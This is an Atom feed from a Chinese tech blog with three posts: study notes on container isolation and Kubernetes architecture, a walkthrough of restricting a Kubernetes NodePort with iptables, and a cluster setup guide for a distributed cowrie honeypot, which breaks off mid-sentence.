<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>woodpile27</title>
  
  
  <link href="http://woodpile27.cn/atom.xml" rel="self"/>
  
  <link href="http://woodpile27.cn/"/>
  <updated>2020-12-25T04:27:56.522Z</updated>
  <id>http://woodpile27.cn/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>深入剖析 Kubernetes 笔记（一）</title>
    <link href="http://woodpile27.cn/2020/12/25/kubernetes-note-1/"/>
    <id>http://woodpile27.cn/2020/12/25/kubernetes-note-1/</id>
    <published>2020-12-25T00:00:00.000Z</published>
    <updated>2020-12-25T04:27:56.522Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://time.geekbang.org/column/intro/116">深入剖析Kubernetes（极客时间）</a></p><h3 id="05-白话容器基础（一）：从进程说开去"><a href="#05-白话容器基础（一）：从进程说开去" class="headerlink" title="05. 白话容器基础（一）：从进程说开去"></a>05. 白话容器基础（一）：从进程说开去</h3><blockquote><p>容器本身没有价值，有价值的是“容器编排”。</p><p>容器技术的核心功能，就是通过约束和修改进程的动态表现，从而为其创造出一个“边界”。</p><p>跟真实存在的虚拟机不同，在使用 Docker 的时候，并没有一个真正的“Docker 容器”运行在宿主机里面。Docker 项目帮助用户启动的，还是原来的应用进程，只不过在创建这些进程时，Docker 为它们加上了各种各样的 Namespace 参数。这时，这些进程就会觉得自己是各自 PID Namespace 里的第 1 号进程，只能看到各自 Mount Namespace 里挂载的目录和文件，只能访问到各自 Network Namespace 里的网络设备，就仿佛运行在一个个“容器”里面，与世隔绝。</p></blockquote><h3 id="06-白话容器基础（二）：隔离与限制"><a href="#06-白话容器基础（二）：隔离与限制" class="headerlink" title="06. 白话容器基础（二）：隔离与限制"></a>06. 白话容器基础（二）：隔离与限制</h3><blockquote><p>“敏捷”和“高性能”是容器相较于虚拟机最大的优势，也是它能够在 PaaS 这种更细粒度的资源管理平台上大行其道的重要原因。</p><p>容器相比于虚拟机也有很多不足之处，其中的最主要问题是：隔离得不彻底</p><ul><li>首先，既然容器只是运行在宿主机上的一种特殊的进程，那么多个容器之间使用的就还是同一个宿主机的操作系统内核。</li><li>其次，在 Linux 内核中，有很多资源和对象是不能被 Namespace 化的，最典型的例子就是：时间。</li></ul><p>Linux Cgroups 的设计还是比较易用的，简单粗暴地理解呢，它就是一个子系统目录加上一组资源限制文件的组合。而对于 Docker 等 Linux 容器项目来说，它们只需要在每个子系统下面，为每个容器创建一个控制组（即创建一个新目录），然后在启动容器进程之后，把这个进程的 PID 填写到对应控制组的 tasks 文件中就可以了。</p><p>一个正在运行的 Docker 容器，其实就是一个启用了多个 Linux Namespace 的应用进程，而这个进程能够使用的资源量，则受 Cgroups 配置的限制。这也是容器技术中一个非常重要的概念，即：容器是一个“<strong>单进程</strong>”模型。</p><p>在一个容器中，你没办法同时运行两个不同的应用，除非找到一个公共的 PID=1 的程序来充当两个不同应用的父进程（systemd、supervisord）。但还有更好的解决方法，因为容器本身的设计就是希望<strong>容器和应用能够同生命周期</strong>，不希望出现“容器是正常运行的，但是里面的应用早已经挂了”的情况。</p></blockquote><h3 id="07-白话容器基础（三）：深入理解容器镜像"><a href="#07-白话容器基础（三）：深入理解容器镜像" class="headerlink" title="07. 白话容器基础（三）：深入理解容器镜像"></a>07. 白话容器基础（三）：深入理解容器镜像</h3><blockquote><p>Mount Namespace 是第一个进入 Linux 内核的 namespace，它们隔离了每个进程可以看到的挂载点列表。</p><p>Mount Namespace 修改的，是容器进程对文件系统“挂载点”的认知。只有在“挂载”这个操作发生之后，进程的视图才会被改变。而在此之前，新创建的容器会直接继承宿主机的各个挂载点。所以在创建新进程时，除了声明启用 Mount Namespace 之外，可以告诉进程那些目录需要重新挂载。</p><p>我们可以在容器进程启动之前重新挂载它的整个根目录“/”。而由于 Mount Namespace 的存在，这个挂载对宿主机不可见，所以容器进程就可以在里面随便折腾了。chroot 命令可以改变进程的根目录到你指定的位置。</p><p>为了让容器的根目录更”真实“，一般会在容器的根目录下挂载一个完整操作系统的文件系统，而这个挂载在容器根目录上、用来为容器进程提供隔离后执行环境的文件系统，就是所谓的“<strong>容器镜像</strong>”。它还有一个更为专业的名字，叫作：<strong>rootfs</strong>（根文件系统）。</p><p>对 Docker 项目来说，它最核心的原理实际上就是为待创建的用户进程：</p><ol><li>启用 Linux Namespace 配置</li><li>设置指定的 Cgroups 参数</li><li>切换进程的根目录 （Change Root）（优先使用 pivot_root 系统调用）</li></ol><p>rootfs 只包括了操作系统的“躯壳”（文件、配置和目录），并没有包括操作系统的“灵魂”（内核）。同一台机器上的所有容器，都共享宿主机操作系统的内核。</p><p>正是由于 rootfs 的存在，容器才有了一个被反复宣传至今的重要特性：<strong>一致性</strong>。容器镜像“打包操作系统”的能力赋予了容器的一致性。</p><p>Docker 在镜像的设计中，引入了层（layer）的概念。也就是说，用户制作镜像的每一步操作，都会生成一个层，也就是一个增量 rootfs。</p><p>Docker 镜像使用了联合文件系统（Union File System），最主要的功能是将多个不同位置的目录联合挂载（union mount）到同一个目录下。下文中以 AuFS 为例。</p><p>容器的 rootfs 由三部分组成：<br>[ 可读写层 ]（容器层）<br>[ Init层 ]<br>[ 只读层 ]（镜像层）</p><ol><li>只读层：位于最下面，挂载方式都是只读的（readonly + whiteout）</li><li>可读写层：位于最上边，挂载方式为 readwrite。<br>在没有写入文件之前，这个目录是空的。而一旦在容器里做了写操作，你修改产生的内容就会以增量的方式出现在这个层中。而如果要删除一个只读层里的文件，AuFS（我的主机上使用的其实是 overlay2） 会在可读写层创建一个 whiteout 文件，把只读层里的文件“遮挡”起来。可读写层的作用，就是专门用来存放你修改 rootfs 后产生的增量，无论是增、删、改，都发生在这里，而只读层不会有任何改变。</li><li>Init 层：是一个以“-init”结尾的层，夹在只读层和读写层之间。Init 层是 Docker 项目单独生成的一个内部层，专门用来存放 /etc/hosts、/etc/resolv.conf 等信息。这些文件本来属于只读的 Ubuntu 镜像的一部分，但是用户往往需要在启动容器时写入一些指定的值比如 hostname，所以就需要在可读写层对它们进行修改。而用户执行 docker commit 只会提交可读写层，并不会包含这些内容。<br>相同的文件上层会覆盖掉下层。在修改镜像层文件时，首先会从上到下查找有没有这个文件，找到，就复制到容器层中，修改，修改的结果就会作用到下层的文件，这种方式也被称为copy-on-write。</li></ol></blockquote><h3 id="08-白话容器基础（四）：重新认识Docker容器"><a href="#08-白话容器基础（四）：重新认识Docker容器" class="headerlink" title="08. 白话容器基础（四）：重新认识Docker容器"></a>08. 白话容器基础（四）：重新认识Docker容器</h3><blockquote><p>docker exec 的实现原理：一个进程，可以选择<strong>加入</strong>到某个进程已有的 Namespace 当中，从而达到“进入”这个进程所在容器的目的。而这个操作所依赖的，乃是一个名叫 setns() 的 Linux 系统调用。</p><p>Volume 机制，允许你将宿主机上指定的目录或者文件，挂载到容器里面进行读取和修改操作。在 rootfs 准备好之后，在执行 chroot 之前，把 Volume 指定的宿主机目录（比如 /home 目录），挂载到指定的容器目录（比如 /test 目录）在宿主机上对应的目录（即 /var/lib/docker/aufs/mnt/[可读写层 ID]/test）上，这个 Volume 的挂载工作就完成了。</p><p>更重要的是，由于执行这个挂载操作时，“容器进程”(容器初始化进程-dockerint)已经创建了，也就意味着此时 Mount Namespace 已经开启了。所以，这个挂载事件只在这个容器里可见。你在宿主机上，是看不见容器内部的这个挂载点的。这就保证了容器的隔离性不会被 Volume 打破。</p><p>这里使用的是 Linux 的绑定挂载（bind mount）机制，它的主要作用就是，允许你将一个目录或者文件，而不是整个设备，挂载到一个指定的目录上。并且，这时你在该挂载点上进行的任何操作，只是发生在被挂载的目录或者文件上，而原挂载点的内容则会被隐藏起来且不受影响。（所有操作都发生在宿主机，而不会影响容器镜像）</p><p>容器 Volume 里的信息，并不会被 docker commit 提交掉；但这个挂载点目录 /test 本身，则会出现在新的镜像当中。</p></blockquote><h3 id="09-从容器到容器云：谈谈Kubernetes的本质"><a href="#09-从容器到容器云：谈谈Kubernetes的本质" class="headerlink" title="09. 从容器到容器云：谈谈Kubernetes的本质"></a>09. 从容器到容器云：谈谈Kubernetes的本质</h3><p><img src="http://xhisall.gitee.io/image/image/1608814135147.png" alt="Alt text"></p><blockquote><p>控制节点，Master：</p><ul><li>kube-apiserver：负责 API 服务</li><li>kube-scheduler：负责调度</li><li>kube-controller-manager：负责容器编排</li><li>etcd：负责存储集群的持久化数据</li></ul><p>计算节点，Worker：</p><ul><li>kubelet：<ul><li>处理容器运行时：CRI</li><li>网络插件和存储插件为容器配置网络和持久化存储：CNI、CSI</li></ul></li></ul><p>从一开始，Kubernetes 项目就没有像同时期的各种“容器云”项目那样，把 Docker 作为整个架构的核心，而仅仅把它作为最底层的一个容器运行时实现。</p><blockquote><p>运行在大规模集群中的各种任务之间，实际上存在着各种各样的关系。这些关系的处理，才是作业编排和管理系统最困难的地方。</p></blockquote><p>Kubernetes 项目最主要的设计思想是，从更宏观的角度，以统一的方式来定义任务之间的各种关系，并且为将来支持更多种类的关系留有余地。</p></blockquote><p> <img src="http://xhisall.gitee.io/image/image/1608814907988.png" alt="Alt text"></p><blockquote><p>从容器出发<br>容器间”紧密协作“ ： pod<br>一次启动多个 pod ： Deployment<br>通过固定的 IP 和端口以负载均衡的方式访问一组 pod ： Service<br>需要配置文件：ConfigMap<br>需要配置隐私文件：Secret<br>需要一次性运行的 Pod：Job<br>需要每个节点上只运行一个副本的守护进程：DaemonSet<br>需要定时任务：Crontab</p><p>Kubernetes 项目并没有像其他项目那样，为每一个管理功能创建一个指令，然后在项目中实现其中的逻辑。这种做法，的确可以解决当前的问题，但是在更多的问题来临之后，往往会力不从心。</p><p>相比之下，在 Kubernetes 项目中，我们所推崇的使用方法是：</p><ul><li>首先，通过一个“编排对象”，比如 Pod、Job、CronJob 等，来描述你试图管理的应用；</li><li>然后，再为它定义一些“服务对象”，比如 Service、Secret、Horizontal Pod Autoscaler（自动水平扩展器）等。这些对象，会负责具体的平台级功能。</li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://time.geekbang.org/column/intro/116&quot;&gt;深入剖析Kubernetes（极客时间）&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;05-白话容器基础（一）：从进程说开去&quot;&gt;&lt;a href=&quot;#05-白话容器基础（一）：从进程</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>使用 iptables 限制 Kubernetes 的 NodePort 服务</title>
    <link href="http://woodpile27.cn/2020/12/22/use-iptables-to-limit-kubernektes-nodeport-service/"/>
    <id>http://woodpile27.cn/2020/12/22/use-iptables-to-limit-kubernektes-nodeport-service/</id>
    <published>2020-12-22T00:00:00.000Z</published>
    <updated>2020-12-22T12:09:48.843Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在搭建了 Kubernetes 集群后，在 master 节点上部署了 Dashboard。我们需要在办公网内访问它，修改 service 端口暴露为 NodePort 模式后就可以达到目的。由于 master 节点部署在公网，我们希望对 NodePort 暴露的端口做限制，换句话说，只允许办公网内的 ip 对其进行访问。开始以为会很简单，用 iptables 在 INPUT 链上加一个 DROP 和 ACCEPT 操作就可以了，但事实上并非如此。</p><h3 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h3><p>查看 kubernetes-dashboard 命名空间里的 service，kubernetes 创建了一个名为 kubernetes-dashboard 的 NodePort，在主机端口上监听50000端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# kubectl get svc --namespace&#x3D;kubernetes-dashboard</span><br><span class="line">NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)         AGE</span><br><span class="line">dashboard-metrics-scraper   ClusterIP   10.110.216.172   &lt;none&gt;        8000&#x2F;TCP        18h</span><br><span class="line">kubernetes-dashboard        NodePort    10.97.249.27     &lt;none&gt;        443:50000&#x2F;TCP   18h</span><br></pre></td></tr></table></figure><p>只要我们访问 MASTER-IP:50000 就可以进入 Dashboard，是在 iptables 里经历了很多条规则才到达的。</p><ol><li><p>经过 PREROUTING 进入 KUBE-SERVICES。由于 nat 在 filter 之前，所以在 INPUT 链做限制不会起作用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chain PREROUTING (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-SERVICES  all  --  anywhere             anywhere             &#x2F;* kubernetes service portals *&#x2F;</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则（ iptables-save 可查看）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A OUTPUT -m comment --comment &quot;kubernetes service portals&quot; -j KUBE-SERVICES</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-SERVICES 进入 KUBE-NODEPORTS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SERVICES (2 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">......</span><br><span class="line">KUBE-NODEPORTS  all  --  anywhere             anywhere             &#x2F;* kubernetes service nodeports; NOTE: this must be the last rule in this chain *&#x2F; ADDRTYPE match dst-type LOCAL</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则，可以看到其会是链里的最后一条规则，只有当上边的所有服务规则都不匹配时才会进入 NODEPORTS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A KUBE-SERVICES -m comment --comment &quot;kubernetes service nodeports; NOTE: this must be the last rule in this chain&quot; -m addrtype --dst-type LOCAL -j KUBE-NODEPORTS</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-NODEPORTS 后，首先经过 KUBE-MARK-MASQ 打上标签，之后进入 KUBE-SVC-CEZPIJSAUFW5MYPQ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-NODEPORTS (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-MARK-MASQ  tcp  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F; tcp dpt:50000</span><br><span class="line">KUBE-SVC-CEZPIJSAUFW5MYPQ  tcp  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F; tcp dpt:50000</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> -A KUBE-NODEPORTS -p tcp -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -m tcp --dport 50000 -j KUBE-MARK-MASQ</span><br><span class="line">-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -m tcp --dport 50000 -j KUBE-SVC-CEZPIJSAUFW5MYPQ</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-SVC-CEZPIJSAUFW5MYPQ 进入 KUBE-SEP-QXJL632FHGWBBYEF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SVC-CEZPIJSAUFW5MYPQ (2 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-SEP-QXJL632FHGWBBYEF  all  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F;</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A KUBE-SVC-CEZPIJSAUFW5MYPQ -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -j KUBE-SEP-QXJL632FHGWBBYEF</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-SEP-QXJL632FHGWBBYEF 的 DNAT 操作转给了 10.244.0.12。正是 kubernetes-dashboard pods 的 IP。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SEP-QXJL632FHGWBBYEF (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-MARK-MASQ  all  --  10.244.0.12          anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F;</span><br><span class="line">DNAT       tcp  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F; tcp to:10.244.0.12:8443</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-A KUBE-SEP-QXJL632FHGWBBYEF -s 10.244.0.12&#x2F;32 -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -j KUBE-MARK-MASQ</span><br><span class="line">-A KUBE-SEP-QXJL632FHGWBBYEF -p tcp -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -m tcp -j DNAT --to-destination 10.244.0.12:8443</span><br></pre></td></tr></table></figure></li></ol><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>在知道了原理后，再要解决我们的问题就很容易了，方式其实也有很多种，我直接选择了最粗暴的，那就是在 PREROUTING 中加入一条规则，将不属于公司办公网 sip 的请求直接 DNAT 到65535，一个没有运行任何服务的端口。就解决了问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -I PREROUTING -p tcp ! -s x.x.x.x&#x2F;30 --dport 50000 -j REDIRECT --to-ports 65535</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://juejin.cn/post/6844904098605563912">https://juejin.cn/post/6844904098605563912</a><br><a href="https://zhaohuabing.com/istio-practice/content/ingress/nodeport.html">https://zhaohuabing.com/istio-practice/content/ingress/nodeport.html</a><br><a href="https://www.jianshu.com/p/c6d560d12d50">https://www.jianshu.com/p/c6d560d12d50</a><br><a href="https://developer.aliyun.com/article/745086">https://developer.aliyun.com/article/745086</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;p&gt;在搭建了 Kubernetes 集群后，在 master 节点上部署了 Dashboard。我们需要在办公网内访问它，修改 service </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>使用 kubernetes 部署分布式蜜罐系统的实践</title>
    <link href="http://woodpile27.cn/2020/12/20/k8s-honeypot/"/>
    <id>http://woodpile27.cn/2020/12/20/k8s-honeypot/</id>
    <published>2020-12-20T00:00:00.000Z</published>
    <updated>2020-12-20T07:57:19.572Z</updated>
    
    <content type="html"><![CDATA[<h3 id="搭建集群"><a href="#搭建集群" class="headerlink" title="搭建集群"></a>搭建集群</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>按照 kubernetes 官方文档中安装 kubeadm 的<a href="https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">部分</a>进行安装</p><ul><li>禁用 swap 分区<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swapoff -a</span><br></pre></td></tr></table></figure></li><li>把 iptables 工具切换到“旧版”模式，按照文档的说明，在较新的 Linux 发行版本中，iptables 工具使用 nftables 后端，其与 kubeadm 不兼容。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --set iptables &#x2F;usr&#x2F;sbin&#x2F;iptables-legacy</span><br><span class="line">update-alternatives --set ip6tables &#x2F;usr&#x2F;sbin&#x2F;ip6tables-legacy</span><br><span class="line">update-alternatives --set arptables &#x2F;usr&#x2F;sbin&#x2F;arptables-legacy</span><br><span class="line">update-alternatives --set ebtables &#x2F;usr&#x2F;sbin&#x2F;ebtables-legacy</span><br></pre></td></tr></table></figure></li><li>安装 docker ：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure></li><li>安装 kubeadm、kubelet 和 kubectl（国外）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install -y apt-transport-https curl</span><br><span class="line">curl -s https:&#x2F;&#x2F;packages.cloud.google.com&#x2F;apt&#x2F;doc&#x2F;apt-key.gpg | sudo apt-key add -</span><br><span class="line">cat &lt;&lt;EOF | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;kubernetes.list</span><br><span class="line">deb https:&#x2F;&#x2F;apt.kubernetes.io&#x2F; kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y kubelet kubeadm kubectl</span><br><span class="line">sudo apt-mark hold kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure></li><li>安装 kubeadm、kubelet 和 kubectl（国内）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> sudo apt-get update &amp;&amp; sudo apt-get install -y apt-transport-https curl</span><br><span class="line"> curl -s https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kubernetes&#x2F;apt&#x2F;doc&#x2F;apt-key.gpg | sudo apt-key add -</span><br><span class="line"> cat &lt;&lt;EOF &gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;kubernetes.list</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y kubelet kubeadm kubectl</span><br><span class="line">&#x2F;&#x2F; 下载镜像（worker节点）</span><br><span class="line">kubeadm config images list</span><br><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;kube-proxy:v1.20.1</span><br><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;kube-proxy:v1.20.1 k8s.gcr.io&#x2F;kube-proxy:v1.20.1</span><br><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;pause:3.2</span><br><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;pause:3.2 k8s.gcr.io&#x2F;pause:3.2</span><br><span class="line">docker pull quay.io&#x2F;coreos&#x2F;flannel:v0.13.1-rc1</span><br></pre></td></tr></table></figure></li></ul><h4 id="Master-节点"><a href="#Master-节点" class="headerlink" title="Master 节点"></a>Master 节点</h4><p>Master 节点我选用了一台已有的 vps 机器中配置最高的，4核8G内存。</p><ul><li>初始化 Master 节点<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init --pod-network-cidr&#x3D;10.244.0.0&#x2F;16 \</span><br><span class="line">    --apiserver-cert-extra-sans $&#123;MASTER_PUBIP&#125; \</span><br><span class="line">    --apiserver-advertise-address $&#123;MASTER_PUBIP&#125;  \</span><br><span class="line">    --node-name master01</span><br></pre></td></tr></table></figure></li><li>-pod-network-cidr：指定 pod 网络的 IP 地址范围</li><li>-apiserver-advertise-address：    API 服务器所公布的其正在监听的 IP 地址。使用 Master 节点的公网 ip 地址，在 linode 上可以运行，在一些云服务商上如果公网 ip 没有绑定到网卡上时会无法启动 ETCD</li><li>-apiserver-cert-extra-sans：用于 API Server 服务证书的可选附加主题备用名称（SAN）</li><li>-node-name：节点的 name</li><li>运行 kubectl（root 用户）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KUBECONFIG&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;admin.conf</span><br></pre></td></tr></table></figure></li><li>安装 Pod 网络附加组件 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;coreos&#x2F;flannel&#x2F;master&#x2F;Documentation&#x2F;kube-flannel.yml</span><br></pre></td></tr></table></figure></li></ul><h4 id="Worker-节点"><a href="#Worker-节点" class="headerlink" title="Worker 节点"></a>Worker 节点</h4><p>Worker 节点上运行蜜罐容器。配置：1核1G内存。跟官方文档推荐的配置有点差距，但也够用了</p><ul><li>加入节点<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubeadm join $&#123;MASTER_PUBIP&#125;:6443 --token $&#123;TOKEN&#125; \</span><br><span class="line">   --discovery-token-ca-cert-hash sha256:$&#123;HASH&#125;</span><br></pre></td></tr></table></figure></li><li>给工作节点打上标签 type=worker 和位置标签 loc=cn or foreign<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl label nodes $&#123;NODE_NAME&#125; type&#x3D;worker</span><br><span class="line">kubectl label nodes $&#123;NODE_NAME&#125; loc&#x3D;foreign</span><br></pre></td></tr></table></figure></li></ul><h3 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h3><p>蜜罐容器需要读取配置文件，我创建了三种配置文件：</p><ul><li>私有镜像仓库密钥，敏感数据，使用 Secret</li><li>蜜罐的配置文件，包含数据管道的地址和验证信息，敏感数据，使用 Secret</li><li>cowrie 的配置文件，非敏感数据，使用 ConfigMap</li></ul><h4 id="创建用于私有镜像仓库鉴权的-Secret"><a href="#创建用于私有镜像仓库鉴权的-Secret" class="headerlink" title="创建用于私有镜像仓库鉴权的 Secret"></a>创建用于私有镜像仓库鉴权的 Secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create secret docker-registry dockerhubsecret --docker-username&#x3D;$&#123;USERNAME&#125;  --docker-password&#x3D;$&#123;PASSWORD&#125;</span><br></pre></td></tr></table></figure><h4 id="创建蜜罐配置文件的-Secret"><a href="#创建蜜罐配置文件的-Secret" class="headerlink" title="创建蜜罐配置文件的 Secret"></a>创建蜜罐配置文件的 Secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create secret generic honeypot-config --from-file&#x3D;config&#x2F;config.toml</span><br></pre></td></tr></table></figure><h4 id="创建-cowrie-配置文件的-ConfigMap"><a href="#创建-cowrie-配置文件的-ConfigMap" class="headerlink" title="创建 cowrie 配置文件的 ConfigMap"></a>创建 cowrie 配置文件的 ConfigMap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create configmap cowrie-config --from-file&#x3D;etc&#x2F;</span><br></pre></td></tr></table></figure><h4 id="创建-ServiceAccount"><a href="#创建-ServiceAccount" class="headerlink" title="创建 ServiceAccount"></a>创建 ServiceAccount</h4><p>向 ServiceAccount 中添加镜像拉取密钥可以不必为每个 pod 都单独进行镜像拉取密钥的添加操作</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">sa</span></span><br><span class="line"><span class="attr">imagePullSecrets:</span></span><br><span class="line"><span class="string">-name:</span> <span class="string">dockerhubsecret</span></span><br></pre></td></tr></table></figure><h3 id="创建-Deployment"><a href="#创建-Deployment" class="headerlink" title="创建 Deployment"></a>创建 Deployment</h3><p>因为 GFW 的存在，在国内和国外部署的蜜罐需要使用不同的数据管道，也就需要使用不同的 